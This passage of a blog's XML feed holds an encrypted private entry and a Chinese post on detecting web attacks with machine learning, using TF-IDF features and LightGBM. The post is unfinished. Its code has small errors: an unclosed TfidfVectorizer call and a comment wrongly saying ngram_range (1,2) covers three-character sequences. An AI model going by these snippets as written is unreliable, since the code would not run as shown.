832862b9374fc5ab3d253460b11a674452c9cb1ba1bb64b290470e332b1d09d04d300585014fa6e40c4f6d6bdce76e5e49679a3a99e1dcb28304b652f5b33f5bdc7d4cb484d8c73b5f216222d77718c14be1e41820ab8676196ebde9c18b2c50f55232defcbc6528b36f7d4aa479b8c3a3832a186fc5409738e61ca9b59461314c21699b384070577b715e408ced15533df1675970614e3733c044cc0a52333d1b6a55484525122da8740c35bb42a9520a36fadf3bbbca614e41f0b7afa6f8e8964123feb5aacaf58fa1b8e2e4a2834b06400e6dafbf9aa141a6d4c9bd6ff87e54d91f9cfa8bd5cb6c505905d29b06065d747afa95fde014e2743683ab041f168670ab3700f8a1e612839fac7af6efb62a12cdf0960c6d384bfd2d9103fd513a0b4620f725ec7e3024b443016ab1c4fba02ee706f41233a1aa12f3c69e068eae8ea63f2e872cfd91d0e84ae1c2afde129a2161f0287ec844d037ce3a9f4d44e4714078506a161e6720ab11bd8e2dc58d9643e4e5effa6600ede84f30a84ed763c3131639c7cd54d5793dd4cbdac444a139e5ed20dea1468b1e39e3397c021d84aee568b31fc44735501b2cead51089d894357c2cb48fee0248ddb0d96d1dd0cc685fb545ba88fc9a0657053b54bab85e3fb7d8e7d3988ba34782f0a8eade6065d763407758f832f3b44314fb41e2383b2922bd46d76c4e55760071b82472c3790cf4be269f4e825cf526ea6b1cbf9ae76f36f54177267a791a7a85fcf5c241a9b8ce38785375de72bf81e7ded5500496874179ada6cf9cbc5d57d7d1062f190734e06b678d3bfc97f31b24104134bdd43995aec4b482fd5b68f9cc0bd8dcccc9bbeb97cf60b84f6f1b3a0c4162718a0883760b94dd303a7b99792034677c76b4f20690c80fb56d9f41da242cc29c8c2c3d0d19a32614d03c26e90f829f95aae4d1de236440840e5698ac70e81ca7e79e3f8a8954278241c5914ec8077c6cb743c70dd9a042a488541fd99a0efcec3d079d165c9f6a13637ce0e1294f9845b2d9311b1d45b55086e7b8f7bb2753c7d68181e8a85bb19f25f3fcb9d52bc077f37c2a83a5b3b59bd007e5d60fd7d0be1240b478df864eb55a09267495d5fbb79f781ce4bd5f611f4c33ec38903c5d651ef29048eddaa91d8c2f182d5cb80eca6884c9f9b087ef16accbcd0d2d3cc1792f1c3c90090d2405036a230c3f7fda1eb88a82b4d73271b0dba0d88ebed05ba408e7879cd39eb5cd01034409e2e2250f4f989549ce7f7fc38a8b48446c834761a65c3668f017a9233d3e85107f52cf3cbe0b9488c6eeac1a0801c9f42fe0756ea7ee7c59b44858c9018100c2177ca2ce07edcb89e996febe83345d526ef21d5379f14ef1a577aae0ed29a3748a6fa2250977771c742a4eaaf6cd71fcb9695495c9c45e980c82099946e8f01a14859c297fe6e8e21b353a3231e9742698a2753fb34b0a90fb328cb92be87690a067c9d8e5cf500876dd63a5be6055b44d821125b3c7ec025693caf65f4950a27e6442dd5ce6add3e69d39c5a006562c131604a6a50ebcbea4bbffd8fdc5c20e4ab086e74de51b3b7daecef3936b4a02dc2ae7e1877546758a94cd6d6de5d6fa609dd82b24b99ddd517c94cb4cefb895a9a020e8f66ad63c09059b8c2ebf4a8e772f10a94b290a3ba51fdf00754c0c9130f34cecf9cd35b4a05f43a9023450f0601673de498994394fe0cf99aa489f27836efe7e9a2ac850cbf2a0bcbacfadacddc58d9ecc301f1fbed6a0504ee3f803249f30013500460f4dbc011478bbe485c162421efdb04e85db789b75820665b9c28b86ac6c291314ea0d99ac13620e54b74ed864757246db2b5920108bb16b93bed920012e9f23029b81e0c690aeac6fc5842a016465d0a0a295c298316c4dbc0f891a8b8d168a2259c1ee273402c901c018c93f7f359c0857d6bbd24a87cf96f90b267ce26c6645eecc052960f22bb83867a73d3a5c31381862aeb7ec6e2f27ce3c9b93435f57b6c85a50860b43abf8278d3bd2067ad8df1503d130bf1a873f14eff6946d1813f0378c6e3586fd674e8272b68f2dc9bac374148946ea27224582f54d610f8badcae86fb8516c6453c18b1b5d592dd12dfb867a75cd3e38c4183e8ed2fcd64539b226ca714e5a4a5e5eddbb4286771512da97d6a5da892b2cb65457bb87f5c66ae032ef1d2116b92d9a93ee3a6c90338054a5a90028d1556a40fae9648eb947a1244af2182f3fae3075c4d2c9aa993fa2400ec639e2e72bc5da97dc6f6e78fccbd0aacb50f6d80a15c9e47f926b2888a978710df60abaff48a8d6c72ad563b52f3a6394dfce596c796d1b9535bb28bb8c01088ef8e4fc57aef38f51089053cb312a53d54c889bd2396d2027dbb72ddc13c519c2e6c8f68cfcb03251f65d783d8250504e3a1cd91e252ca153da93888fc1204b617818e83d398fe724ffc4b5d704dfcb0d76e1f4eddbe28c3da477a0d73447ced9b208cdbba96e131c3fcf53e6531d089dd7571aa127ad6b552d08c8b39e13e4c3017208be3dfacb8fadd640ccbc6b3ef9429e0da3ece0d54f668fe804099d32abaa3b810a4a409270e7bab3892415a3bf32dbc0f39e96be327a34c11f7a9f70f47e1ec2f4c0bf36b268b7cc642895936c0aba96afc66829c1c8b73d97a675e8d7b908699ed7563fc3594f83cbac1f188bf9c9923b9220949ce961e48cf75582ebedfa67703c60aaac7125d401638882b16dfd0e5fdbe89f9c7ca37e24bafdd11d818306023484350bbaa3f854f6a40c12ed82cb6ae03c2a1a77fe360195040f42b41a8cd1842754817c8fa8091444b240f95e59bc62236a433f01a4c8b5587d52f2de009761126a33cbed148bb3899758e2cb57e9f91f7dc36899efb067176bb4ceafcdbf4a7da7c29a25ff1a39fffaba2d231dc71038d256101b591b7e4db50e25f8d442ba72e59c948b0824c45c41bd36ea85bc5ad2d248a8c5d27dc2133389307d8a9c025fac2a939e86cf4ae8289c573095f3f27f1c0f3e2dfe2e4485cdbfaae87ffe7b058ed22fdf99277dca7e609661b9e91a317b3aec5366e57a60c2c4b8eabb9acbacc99e32c4218e79d2560eaf5d3be2a57b750ba9069a40c97809bbd4c19d54b5e241d09f8bfd8774aae0dbce120a3bc04ee89e843e8456af56103fb88836f27c33a6de05c76493d2526fa96d38404fff078bb90f58b440e6c2b609e926f49519e72aa0218bf6f294da1a282510020d5dc6b3012b36e41c351c9c51c49d8aa2e64259e66646db54deb16b82d9a72805ac83a4161acbc3785172313f5fcdea0babdc2b7ac3f2384c726d0360f5f62570fa9f25e6e76cc45d309c3885a80b6b9a673cef117494bd62d66b61c51f4bc7e3e0e2dd262784548616bb184e797a38f21675ac1317bd1f92a222c5af9f15097e7eb042f25704d59ee61683f5b09c778d852f631655a6e6bb6f042f222e7c782032ff5a57a30d79b52c9c96dd6747478f9ec719cff0d7b1d9e06d2c0030512c03b803ff13b7159af2a3599d8d13c452ecd4ef89796bee0240080f46e3c2f55c9ea809b3599aee014168d8b40e89d1a607c930b46a7b0603eb41af9f069e2cabe112ecb46bb8705ac1e03b3651fcbfa1357818379ae2a61540b6351a0e3407e3b9b5ed5b23b34d73d2a0a71e3977ab8fd5e41b3a80a717d60108c2ed5199ef43860bf5c5256d52eafdcff0632178c55b05081586d7faaa02ecf6d9dca34282c210029e888b24f05fae3f8da95881069ab4acba480773d9028f82be8b7c1729e643442423689c4b2c8f5763d5d54aec0debd9f2d8c4697327218ed8da252fb52e31ecad20b4b739dfe5fff83dc9900bf8e7736adf76f36a55f9d7ec77786c149742d69e9d09abd41f9de700d212e510c311569ce27ac4fc656c8cce96a9b9a01fffd3fd825ca493e28ba1b761b63cc0e9bb6b25d813b802655f0988865e2604738dfb67529758077c9648c0ccc788b6e3470bb26769f147eabd2b30e84cb7ea69ffc54525185ed3146607e3de30be170be628bd3af2518adef949c0813e5e8cd24113edb8c6c95ae37bd8712a2f79988f7adf02796f0f28d867a476d26480a7e4df33282aadc3783b7d1f5e13264993cc3cd72c7dbfad42d2f582a5ec1ac002f767ded0bc42bf3ff4dd9525e01327fd694703d586537c215037ec36a4b4ee4ca4d86dd32287fb69ccb46a4cfffeb32e5a7a577ff8c82ed31eb55936a05f9cd989ad49ab615f3cd37b3128ea8c32abfa099ec7fcb8284b71ad7f36681a89d0cee25f3acf6140e43864b061157374ce723a433fbf34e16c6d8ff527c143fbea6ee0203a0753dda2fb78b5b7cda719e303195bd61aaa3a3d830ae5652c47f88e4c597ffa9c20e19123622cfb73508cf3f7ec2617cd39b51d5c134fbdbe040de2d73319e64b6ba1a04771e2328027f857775b3990b333077464789c634a98f3047f1657ea9093357b2b0c14d98b426b9bbf34a07ecb54668e3954c4cc400aad0cddbd911f1f33248529f6c34de476977438fc03b469e246a2e9cd767d3aec5ad701307076743c27de53bd2761091c02a182d6c3b61207cec974d4bf99a927a81600a69f677dbe02694a610f8a076e0663099006e201fbf46d1f466a02025f72e6cba68e57d5e7b6bce9d8183d7b67d3061d19f0ce880667d51ba7dd172aaa5aac3f6e45638a5bdac1fef18ed7bf50a7f60aa232a64c487f9a2c59bf3d929cc39ef3866784b53eda9de3f5612dbee06c06eb18ec920ac933bd95453c3735c8db411353c0b2c6bc6163f72cad4b1a431a3467d4e4aead440a1d4c64093dca2bd77433fe83b20518b9e8566e003ece260d564f0419995be107aff0c4f80156bba793ddf65e52425396abfeb0587d294b36a088de666d2d07aeac86079d014e53bd594c18819e15bc0a1dcf0222e198c261f84f915c33a7456c3130f6c10f946700629839a3f6293bac7a78d8f0be10f165644d0688ee212f9def6d1c160f22ef2468c3876e76d703749cfd7f04935b6694b13db83851b38561f897b2d6c6d083edf9c5986e1ff6c9a5d4e878322d3c9967c9d4fb4eedc9a7e5cac2b726e7c884dd370317d75bbe16763207214312ead66b2667e03fb8b20436854e19054c8806d825ca87842e4d173bb7c4e22d7c5a97bb0b71f486396ca5a7bca19d2fbc27a523bffd1d9179b144b772d6596df96b74e350f6ff48ec173bd0ecad5afd346e89496e2cee0363be2559ab12d8a7ffe4ccbddebe7b89bdaabf161335478c01d6b16abbebc00119a414648733b9a8e09157a5b0df6f2d143038efac69abd11d3cf05bd0124a41cf26eccf22a3134296b8708b4c2e9bd842aaff7f066b7039bd97d88f7b8b69b7c49ec0f6daaa2262094f00d84c48854cae14234cba7a5856547aa5989dc68cf34fe0feb349ac6327345637c9cdf9a21f25f85565d6ef8c7e1ff3a7413c7d7ea55c488dbd5e88463104bf22ee4e5619c0d3b1b6d85eace94535b051d273fe4c94b53339380e46e7320664d86959c67d8e88b53204543476652eb145eb6bcdc5e8ab2a2a790e305463533a9b743f8010352bc4a3687c60611528423b977fda0c5410819259d5f62530f9887d950150fb75a1dedcef96749681c9b1d63e4a7b0bd6471cb347dc28fc5b75ef9e096cb8435611cf5f613849820ab45cf058dde82534e32c3625264531d16b9fcf64a321f80623048786c7eecb72a662d45ec349427bf9fc65ff6422c01664969963b11648fe0eb4340ad8d0f64a8a2d2eb73126fccf439e3f5ea773b373b9b4018abe17c12834395d3d6be122c58c980a89ee157798bf3d9969250128d0c92f03a6c783964f61580ea881ba67b2abc065974edaba08c3b63725c73473ad97a0d2d7e2a12151a907c0f32c943e787cd41d6c7830394c5904f0bf5708c6e006360ed64392329d25ffbf38019549ab1bfd2d862723b9a6b508259d8e1326bc37d87a66cb52d522951fbb17ec238c30e490b4205b17c8901eaa2e6c22cac8210d09e5343222fb01771a32c0152eefa7d6fdbc238b8eebd9781ee632d9b11192577c5087fff0dcfc602c039e829292dadc0813720092aebaed2667fc989ad96fe7f9235721ba7a2e0f77d1950068b8967250e9c80718af4d8c6ae546ffae36cad29a44379339d0169258dae2d1f8e56708a1855ec66b4539827094826b197fc72e641ef290ec3b22a36a4c6d94100b4878ce99780b7e769a4b29b151b70f86c6d9b50f01d83a13d0c71cd28b1e17bb093ace724a5943a7242cbee1feab1535c8978ed48dd06482e3af1a60ac48edbf5d89934b305f30455e1db91a916fd8e5eff8a564b25728247301bcdd76e86b5da31329f908bd8a3e88f591f04ab6e93780d75dc0767bedeb76bdde99fc7f69357b363e4cf3c0dabf6177d12a1603fc7a6888384e4130efa76963ce02c8dfafa31993327c1589d5f738c139e0cb35f295a61b006f12ec604ad6190d5c393fed39bd6af6bbc964cdc6fcb8397ad474390ed774ba3995e4f778509bb6a8630ac93c69aeb1c50ca1de40af570802290bc21471e312121afc0a65ae8d4461f00445ba9a82e2087d7f57c89cc4811072668f6ea5e804118715309d2247241bd91928493d48da3ffad2cba131225a63bd9876354bb1f64351d9f983db17a944653ac98b3350cb5c7789b7a4dccf6ba209f1a347b7d7b78d306600ff011f82580a7f7f1302445ca9061c36c1f07977cf07ec040594e4554637f01264bd2b10b144ed92b0ea75237dd826e14decc882c4e417c43f3eb161cc7111e7b32af125bceb2ce3cdd129e13fc8d9a489e4944126e5f58ee99832cf86993e5e491cbb7d3603219a92fa19bee60743ef8da6442d44ff964df37dc0331d17439b92c6b60c6a864b178c72a9b7ee6d4671e4c735a2e2832d446aaac10c474bea9e0e80dbd337a5a082590a1ca1daff85389cc8450c8dab2b83281cfd07f6782c90240da16420eb23118e99b245facbbbe267a5d4ddac97355b9a6d130985b3f426a1b360a8d0aa7b527d27c7e5b55c6f9ff5c68f56733ee65e203399476e1287f5f420ba65c0e95e19f6a90dd14e40ee2655afb2beaece3278ef6bb5c28c03f2d1b04a22bceac7384a50b4c8056d9438cc253b9907f30244451e69953f6acd30a8ff186845aef09515fc4118ec5c1f56c4aab5f1af8389e03d03e77bbfd2a84378ff3e96f5471eacb2ab3df0940295682780fddf47e69f3f391be5c541d3675316531557ac815715ee020b5dc7d2ffe9ed4401c590d7fea7dd196ccf3137497334fc4947a992f18efea65e0147c96e3924905990a1e7b159e43f38d44120d33c3b78780c608ee15779fc956691851c97dc21cfa3b749b76a9a4e8e51476f22b7a8b9c109ef8f375c0344b95313709caf3dc2b025ed11bdb2aa30b9ed4e00a5ba4cecb181630538669c31fabecf33157e5f97d95dcad45901af988896c94b48df2d99dcfdf4214725fea127a096a124b5e9967553a169fc421df7b5f579425f3bf2248b24ac049eb217cae22a58e2342bac8fb8ffaf9fa1f3a7e048d4054848d7ec56f3bdb1503116170c4e4d241c4a4d662f7b1f9894f298d83401875de1b7d7fe3253c4589f4bf2d068861ca41bab47cacdca0333df53e47c875d3fbcffce7acadcccd844db6f81c31f91222ff189468812a439ac9f42870b610e00bebf7845864b2ae8b38a0d9b587c40cde10e20b8ae49edc52054af4e15484347d18b0ccf0075ca1d9305cd26bd7791260ccd3a7aacb566b4241e098e9d530cea6b4ae707dbb2716f429522c630cbeb6631357df6b122b992a3f6e11ad53dd00a59d3d5de969ec2db9d339f3a32e459fe1bf6a5c7722b1f17c383f28a3a6c6ec76db102b5b2677c1e10dd17913bfce6bef6c9f16d66c5c0fb1bf37d5626a5aeba72a8d28270fed4c0738a5a200c8430de15bb894c24b8c8ecf6974f3dec31f2b6631966428d271a9e093c78b7c0fb9c1722ad0c7611cab0e5bd952fd91ef1779dda1a5afb49c7a8fdd16beb7a949b11c74ba8ae3c2ce62ada6f5820bbb7742e179b317b3ccb33714abd59d1933884972c6c7379280346055e53799aae40d7b301be0190ed7dea8895b7ae3d9ddd4a907b74fa910f9c559d1e0d00281f87be670c4dd4023d14e024f4a961a187eddda448b9665a207c26d529cedd932fe5864161af428750bd74648d45c84eda46e71d2a7920ee34bbef95d90533e3121e1323031e8c7edbcea804ab418ae4740497357fb59858f94a3f919d7d72264fc2d9cbf506f7326964aa5a92eb7fb9ac3e6c02abd03553bd9d02d3c1a3077222b3b646e7200367c53f3b6e1166d631144bb95530a6e3e0882102bffd802c9c4c3ef5c6da5eb14f22c454749aeb6d2fcb21cc0414faedf1004f53e0ac808b7ddf2cf43fa85f3daae95f819bc62bb8773f6c099573641dc6c75c89d9a1a60c253e4b98939784e65e85cf3a64846b1c7e6db77ee8439cc3a0534160b7bfa48fc58b23fd2951e4c1dcf1a2f87c68fe42e1cc2ab93adf12085a70147cef3c8114e81d9d86764d69e675e51c8ea2382692e67a96aa336804d5b72fb7bc08e1e8dbbbfe635e8ca902e25c69154e59f727c922f648860de48eaba2c109195c5dd707905f48825252573e87b540ef855d207767cb52f8dc8c1e00e050211ca981c6305462c7918231f0f59d82569a34454c860d8508304ba90d45be83a9086ca6060e1f96632500c09d7e49ce0c91c673e2ceec8b9ac95395c223c01d1cda577d7ca739719d18854ed833ae8c8ca8d35f76f1045570bcc87005815ee28e25932074bc3ec537cdaef3ae54a2612c5036d8998c9f2656b9de3c030edbf65910f4463d4fa2c6761d7bb12dbf63b977eaf69f363766d0729f23bde12ad5a6a40813333230dba838476beea06f5fffd0679b1f8c05483d873be0ca0b370a3f42872164af591e43da234a89c07d2af397c4e016c2f0cbe10b21de79ff86a2bfaf3d703cd44857c5e849d25af6eec200edbc359e1daf73c128283a4d49f7c3bf7f63126db3dadb1a7ed7b3f31244d00b411140be5df5e042a47255f593a566a1f5d32fa13a571b5129cffd09d17f77875c87d7d9912297783465b6ce80f3382e559d31120db1f88cfa016fcefc6e8da17a7a921d954fc9dc75a5fdfce2bbe227f7859b83ff512bdde92b1115b0606cff106cce38f71b8a98df19d445af4c0a91cd655dc71b99fae1a69b2bd9ae9556f9f3d11bc63eca3bb35e0746879e4f17bbf86582a5bea60101ba2aa0250f40b012d3129149549550e9fe9a2e6a07c32dfc66b0c91ad4cfee041dc74da106aa799987da26d59bd6e1e6a57e840dd0f8084846f73607723dfaae43b93c1523d7c48838f8c28b8cb0c0b4576827278f758387b945b2ad526e7f945d7661dac3b45fc5a16aef0e3bd580b7ba1970f3683a00f2e771970225c5a99d78003c76e969de4ad8f4f5ff9b272413919876cba0bde69f70650d792dd57bf7f784304c8a5025a6c69cbd5ad6417b2968c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">笔者自己看的 (h1nt：牢大，我想你了(╥﹏╥))</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web攻击识别-机器学习</title>
    <link href="/2024/02/09/web%E6%94%BB%E5%87%BB%E8%AF%86%E5%88%AB-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%B0%8F%E9%A1%B9%E7%9B%AE/"/>
    <url>/2024/02/09/web%E6%94%BB%E5%87%BB%E8%AF%86%E5%88%AB-%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%B0%8F%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>一次简单的机器学习实践，学了一些机器学习模型、文本处理、特征工程、超参数调优等，以及数据清理、特征提取、文本处理等处理大数据方法。</p><p>要求：对提供的训练集进行分析，通过特征工程、机器学习和深度学习等方法构建AI模型</p><p>由于之前没有机器学习的基础，因为本次实验参考了一些论文。一开始作为小白，是完全不懂这个要咋搞的，后来看了周志华的《机器学习》和《python大战机器学习》了解一下基础概念。像一些算法、模型的具体的原理其实了解一下大概就好<del>放在代码里无非也就是一个函数的调用</del></p><h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><p>观察数据集，可以看到有6种不同攻击类型的数据集，以及1个测试集，里面的访问请求就是正常抓包获得的请求，包含浏览器类型、user_id等<br><img src="/images/new/1.png"><br><img src="/images/new/2.png"></p><p>按照流程，首先进行数据处理，第一步通过正则匹配获取url中请求的参数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_url_query</span>(<span class="hljs-params">s</span>):<br>    li = re.split(<span class="hljs-string">&#x27;[=&amp;]&#x27;</span>, urlparse(s)[<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">return</span> [li[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(li)) <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>]<br><span class="hljs-comment"># https://example.com/page?name=John&amp;age=25&amp;city=NewYork&quot;[&#x27;John&#x27;, &#x27;25&#x27;, &#x27;NewYork&#x27;]</span><br></code></pre></td></tr></table></figure><p>其次是将url解码，也就是将其中的特殊字符转化为%+数字的形式，略</p><p>还要匹配文件扩展名，也就是.后的字符(正则表达式学得不好)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">return</span> re.search(<span class="hljs-string">r&#x27;\.[a-z]+&#x27;</span>, x).group()<br></code></pre></td></tr></table></figure><p>user-agent信息提取:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># user-agent信息提取</span><br>df[<span class="hljs-string">&#x27;ua_short&#x27;</span>] = df[<span class="hljs-string">&#x27;user_agent&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: x.split(<span class="hljs-string">&#x27;/&#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 斜杠分割后的第一个部分，也就是浏览器类型</span><br>df[<span class="hljs-string">&#x27;ua_first&#x27;</span>] = df[<span class="hljs-string">&#x27;user_agent&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: x.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 浏览器或设备名称</span><br>eg: <span class="hljs-comment"># Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36</span><br></code></pre></td></tr></table></figure><h1 id="用TF-IDF算法提取特征"><a href="#用TF-IDF算法提取特征" class="headerlink" title="用TF-IDF算法提取特征"></a>用TF-IDF算法提取特征</h1><p>在开始提取特征之前，首先还需要分析特征，这里由于给了6种不同类型的训练集，因此一开始我打算针对不同训练集分别进行特征提取<br>针对不同类型的Web攻击，可以提取以下特征进行训练集的构建：<br>比如针对SQL注入，可以提取SQL语句特征，检测SQL查询中的关键字和结构，如SELECT、INSERT等，针对XSS跨站脚本，可以提取HTML标签特征和HTTP头部特征等，如Content-Type、Set-Cookie等。</p><p>然鹅搞了一半觉得这样还是可能有考虑不到的地方….遂上网上找代码，发现网上的更简洁，一位大哥的思路是直接把数据集合并成一个，然后提取url查询参数、参数长度等共同特征，<del>我心想原来如此，那我还搞个P啊，</del>于是我也从简单的入手，直接6个数据集ctrl cv合并，然后代码一焯提取共同特征:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><br>df[<span class="hljs-string">&#x27;url_query&#x27;</span>] = df[<span class="hljs-string">&#x27;url_unquote&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: get_url_query(x)) <span class="hljs-comment"># 提取url里的查询参数</span><br>df[<span class="hljs-string">&#x27;url_query_num&#x27;</span>] = df[<span class="hljs-string">&#x27;url_query&#x27;</span>].apply(<span class="hljs-built_in">len</span>) <span class="hljs-comment"># 存储每个url里查询参数的个数</span><br>df[<span class="hljs-string">&#x27;url_query_max_len&#x27;</span>] = df[<span class="hljs-string">&#x27;url_query&#x27;</span>].apply(find_max_str_length) <span class="hljs-comment"># 每个url查询参数的最大长度</span><br>df[<span class="hljs-string">&#x27;url_query_len_std&#x27;</span>] = df[<span class="hljs-string">&#x27;url_query&#x27;</span>].apply(find_str_length_std) <span class="hljs-comment"># 查询参数的长度的变化程度(标准差)</span><br>df[<span class="hljs-string">&#x27;url_path_len&#x27;</span>] = df[<span class="hljs-string">&#x27;url_path&#x27;</span>].apply(<span class="hljs-built_in">len</span>) <span class="hljs-comment"># 路径的长度</span><br>df[<span class="hljs-string">&#x27;url_path_num&#x27;</span>] = df[<span class="hljs-string">&#x27;url_path&#x27;</span>].apply(<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">len</span>(re.findall(<span class="hljs-string">&#x27;/&#x27;</span>, x))) <span class="hljs-comment"># url里的斜杠数量</span><br></code></pre></td></tr></table></figure><p>然后就是提取特征了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_tfidf_feats</span>(<span class="hljs-params">df, col, n_components=<span class="hljs-number">16</span></span>): <br>    text = <span class="hljs-built_in">list</span>(df[col].values)<br>    tf = TfidfVectorizer(min_df=<span class="hljs-number">1</span>,<br>                         analyzer=<span class="hljs-string">&#x27;char_wb&#x27;</span>,<br>                         ngram_range=(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>), <span class="hljs-comment"># 1-2的ngram特征: 允许长度1、2、3的字符序列</span><br>    tf.fit(text)        <span class="hljs-comment"># 进行拟合</span><br>    X = tf.transform(text) <span class="hljs-comment"># 将tf转化为TF-IDF特征矩阵x</span><br>    svd = TruncatedSVD(n_components=n_components) <span class="hljs-comment"># 截断奇异值分解(高阶矩阵-&gt;低阶)</span><br>    svd.fit(X)<br>    X_svd = svd.transform(X)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n_components):<br>        df[<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;col&#125;</span>_tfidf_<span class="hljs-subst">&#123;i&#125;</span>&#x27;</span>] = X_svd[:, i]<br>    <span class="hljs-keyword">return</span> df<br></code></pre></td></tr></table></figure><p>创建一个TF-IDF对象 tf，然后给定参数，比如n_components用于指定截断奇异值分解后所保留的奇异值个数，也就是要将原始的 TF-IDF 特征矩阵降维到的维度数量，具体这块涉及算法</p><p>有些特征后续是8需要考虑的，比如’id’, ‘user_agent’, ‘url’, ‘body’, ‘url_unquote’, ‘url_query’, ‘url_path’, ‘label’这些</p><h1 id="利用lightGBM开始训练"><a href="#利用lightGBM开始训练" class="headerlink" title="利用lightGBM开始训练"></a>利用lightGBM开始训练</h1><p>用lightGBM模型训练，起码要了解K折交叉验证对象的含义，才能选择参数填进去<br>“k折交叉验证基本思想是将原始数据集分成k个子集，其中一个子集被保留作为验证模型的数据，剩下的k-1个子集被用来训练模型。这个过程重复k次，每次选择不同的子集作为验证集，其余子集作为训练集。最终，通过对每次验证结果的平均值进行评估，得到最终的模型性能指标”</p><p>好，肥肠简单是不是，然后进入超参数调优环节：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">learning_rate：学习率，控制每次迭代中模型参数更新的步长。较小的学习率可以提高模型在训练集上的稳定性，但可能需要更多的迭代次数才能达到最优解。<br>metric：评估指标，用于衡量模型的性能。在这里，使用了 <span class="hljs-keyword">multiclass，表示多分类问题，模型会输出每个类别的概率分布。</span><br><span class="hljs-keyword"></span>objective：优化目标，定义了模型的损失函数。在这里也是 <span class="hljs-keyword">multiclass，表示多分类问题。</span><br><span class="hljs-keyword"></span>num_classes：类别数量，指定了分类任务中的类别数量。<br>feature_fraction：特征采样比例，用于控制每次迭代中随机选择的特征比例。它可以有效地减少过拟合。<br><span class="hljs-keyword">bagging_fraction：样本采样比例，用于控制每次迭代中随机选择的样本比例。也是为了减少过拟合。</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bagging_freq：样本采样频率，指定了进行样本采样的频率。设置为2表示每两次迭代进行一次样本采样。</span><br><span class="hljs-keyword"></span>n_jobs：并行运行的作业数量。设置为-<span class="hljs-number">1</span>表示使用所有可用的 CPU 核心进行并行计算。<br>seed：随机种子，用于控制随机初始化和数据划分的随机性，保证结果的可重复性。<br>max_depth：树的最大深度，控制了每棵树的复杂度。较大的深度可以增加模型的拟合能力，但也容易导致过拟合。<br>num_leaves：叶子节点数量，是树的另一种控制复杂度的参数。它决定了每棵树的叶子节点数量。<br>lambda_l1：L1 正则化参数，用于控制模型的复杂度。增加这个参数的值可以增加模型的稀疏性。<br>lambda_l2：L2 正则化参数，与 lambda_l1 类似，用于控制模型的复杂度。<br>verbose：控制输出信息的详细程度。设置为-<span class="hljs-number">1</span>表示不输出任何信息，通常用于静默模式。<br></code></pre></td></tr></table></figure><p>哈哈哈看不懂寄了(bushi)<br>赶紧百度：<br><img src="/images/%E8%B6%85%E5%8F%82%E6%95%B0.png"><br>找到了<br><img src="/images/%E8%B0%83%E5%8F%82.png"><br><img src="/images/%E5%8F%82%E6%95%B0%E8%8C%83%E5%9B%B4.png"></p><p>睡觉了，完了再更</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>刷题</title>
    <link href="/2023/06/17/%E5%88%B7%E9%A2%98/"/>
    <url>/2023/06/17/%E5%88%B7%E9%A2%98/</url>
    
